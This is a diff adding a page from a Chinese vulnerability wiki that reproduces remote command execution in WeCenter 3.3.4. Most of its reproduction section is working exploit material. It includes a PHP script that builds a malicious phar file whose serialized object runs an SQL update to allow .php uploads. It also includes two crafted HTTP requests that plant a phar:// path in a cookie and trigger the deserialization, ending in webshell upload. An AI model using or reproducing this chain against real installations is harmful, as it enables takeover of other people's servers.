@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/WeCenter/WeCenter%203.3.4%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WeCenter 3.3.4 远程命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WeCenter 3.3.4 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../WeGIA/WeGIA%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../WeGIA/WeGIA%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeGIA存在前台任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeCenter%203.3.4%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeCenter%203.3.4%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        WeCenter 3.3.4 前台sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wecenter-334">WeCenter 3.3.4 远程命令执行<a class="headerlink" href="#wecenter-334" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>WeCenter 3.3.4</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">远程命令执行<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><strong>WeCenter</strong> 后台的 <strong>允许的附件文件类型</strong>
+处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意
+<strong>SQL</strong> 语句执行的 <strong>POP</strong> 链，往字段中添加 <strong>php</strong> 文件后缀。</p>
+<p><img alt="" src="../resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png" /></p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<span class="k">class</span><span class="w"> </span><span class="n">AWS_MODEL</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">_shutdown_query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">_shutdown_query</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_shutdown_query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_shutdown_query</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="o">$</span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;update aws_system_setting set value=</span><span class="se">\&#39;</span><span class="s1">s:45:&quot;jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php&quot;;</span><span class="se">\&#39;</span><span class="s1"> where varname=</span><span class="se">\&#39;</span><span class="s1">allowed_upload_types</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">);</span>
+<span class="o">$</span><span class="n">evilobj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">AWS_MODEL</span><span class="p">(</span><span class="o">$</span><span class="n">sql</span><span class="p">);</span>
+<span class="o">//</span><span class="w"> </span><span class="n">phar</span><span class="o">.</span><span class="n">readonly无法通过该语句进行设置</span><span class="p">:</span><span class="w"> </span><span class="n">init_set</span><span class="p">(</span><span class="s2">&quot;phar.readonly&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="o">$</span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;poc.phar&#39;</span><span class="p">;</span><span class="o">//</span><span class="w"> </span><span class="err">后缀必须为</span><span class="n">phar</span><span class="err">，否则程序无法运行</span>
+<span class="n">file_exists</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">Phar</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">);</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">startBuffering</span><span class="p">();</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">setStub</span><span class="p">(</span><span class="s2">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="p">);</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">setMetadata</span><span class="p">(</span><span class="o">$</span><span class="n">evilobj</span><span class="p">);</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">addFromString</span><span class="p">(</span><span class="s2">&quot;foo.txt&quot;</span><span class="p">,</span><span class="s2">&quot;bar&quot;</span><span class="p">);</span>
+<span class="o">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">stopBuffering</span><span class="p">();</span>
+<span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<h3 id="_5">利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>这里以 <strong>RCE</strong> 利用为例子。我们先用上面的 <strong>EXP</strong>
+生成文件，然后找个可以上传文件的地方。这里要注意，一定不要选择在用户头像处上传。这里我们通过发起问题的地方来上传文件。</p>
+<p><img alt="" src="../resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId28.png" /></p>
+<p>通过如下数据包，将 <strong>headimgurl</strong> 插入数据库中（ <strong>Cookie</strong>
+前缀每个网站都不一样，修改成自己的即可）。</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/wecenter334/?/m/weixin/binding/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0.0.0.0</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl7d5skae6ebea69bp8r1b4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcIFvaZbkaxoQfofEGo%2FSOCyrXq5R0lZofmF9uqaJHO5tpVyag7GEP3fdh9hKvPUf8Xj4x3kkxgLXcf1L4wocSQu9BUquhozfdiEN2Hfg8vj73XVn1f09yLfbpfbVs7K; xhj__WXConnect={&quot;access_token&quot;:{&quot;openid&quot;:1},&quot;access_user&quot;:{&quot;headimgurl&quot;:&quot;phar:\/\/uploads\/question\/20200116\/f39510a7e8e47e3e4dcabbadeedd12f7.gif&quot;,&quot;nickname&quot;:&quot;mochazz&quot;}}</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="err">$wx</span> <span class="l">= array(</span>
+    <span class="l">&#39;access_token&#39; =&gt; array(&#39;openid&#39;=&gt;1),</span>
+    <span class="l">&#39;access_user&#39;  =&gt; array(&#39;headimgurl&#39;=&gt;&#39;phar:///uploads/question/20200116/f39510a7e8e47e3e4dcabbadeedd12f7.gif&#39;,&#39;nickname&#39;=&gt;&#39;mochazz&#39;)</span>
+<span class="err">);</span>
+echo json_encode($wx);
+</code></pre></div>
+
+<p>接着通过如下数据包触发 <strong>phar反序列化</strong> 执行 <strong>SQL</strong> 语句。</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/wecenter334/?/account/ajax/synch_img/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0.0.0.0</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb72k9k1sl53gqibbg53nf32o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9hSYaQOjPMdtxOXo9jQuCVQSykmK88gl3DTI4AmL%2BnhLpgnHFGGSHkzxAPYaVMbXo%2FAndADc%2FaD0wytUEK71YrLmxWCuEZDCSwn9b0ApyOpcIKa6E4cOotHqZpZwVq%2B</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+
+<p>现在，我们就可以随意上传 <strong>webshell</strong> 了。</p>
+<p><img alt="" src="../resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId29.png" /></p>
+<p>image</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../WeGIA/WeGIA%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../WeGIA/WeGIA%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeGIA存在前台任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeCenter%203.3.4%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeCenter%203.3.4%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        WeCenter 3.3.4 前台sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
